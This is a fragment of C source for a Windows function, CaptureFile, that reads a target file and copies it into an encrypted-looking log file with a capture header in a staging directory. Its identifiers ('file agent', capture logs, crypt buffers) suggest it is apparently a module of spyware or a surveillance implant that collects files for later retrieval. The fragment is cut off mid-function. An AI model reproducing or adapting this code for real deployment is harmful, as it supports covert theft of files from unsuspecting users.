void CaptureFile(WCHAR *file_path, WCHAR *dest_dir)
{
	static DWORD i = 0;
	FileAdditionalData *file_additional_data;
	BYTE *log_file_header;
	BYTE *temp_buff;
	DWORD header_len;
	DWORD dwRead;
	FILETIME time_nanosec;
	WCHAR dest_file_path[MAX_PATH];
	HANDLE shfile, dhfile;

	if ( !(file_additional_data = (FileAdditionalData *)malloc(sizeof(FileAdditionalData) + wcslen(file_path) * sizeof(WCHAR))))
		return;

	file_additional_data->uVersion = LOG_FILE_VERSION;
	file_additional_data->uFileNameLen = wcslen(file_path) * sizeof(WCHAR);
	memcpy(file_additional_data+1, file_path, file_additional_data->uFileNameLen);
		
	log_file_header = Log_CreateHeader(PM_FILEAGENT_CAPTURE, (BYTE *)file_additional_data, file_additional_data->uFileNameLen + sizeof(FileAdditionalData), &header_len);
	SAFE_FREE(file_additional_data);
	if (!log_file_header)
		return;

	GetSystemTimeAsFileTime(&time_nanosec);	
	_snwprintf_s(dest_file_path, sizeof(dest_file_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\%.4X%.8X%.8X.log", dest_dir, i++, time_nanosec.dwHighDateTime, time_nanosec.dwLowDateTime);
	dhfile = CreateFileW(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
	if (dhfile == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		return;
	}

	shfile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (shfile == INVALID_HANDLE_VALUE) {
		SAFE_FREE(log_file_header);
		CloseHandle(dhfile);
		return;
	}
		
	if ( !(temp_buff = (BYTE *)malloc(CRYPT_COPY_BUF_LEN)) ) {
		SAFE_FREE(log_file_header);
		CloseHandle(shfile);
		CloseHandle(dhfile);
		return;
	}

	if (WriteFile(dhfile, log_file_header, header_len, &dwRead, NULL)) {
		LOOP {
			dwRead = 0;
			if (!ReadFile(shfile, temp_buff, CRYPT_COPY_BUF_LEN, &dwRead, NULL) )
				break;
			if (!Log_WriteFile(dhfile, temp_buff, dwRead))
				break;
		}
	}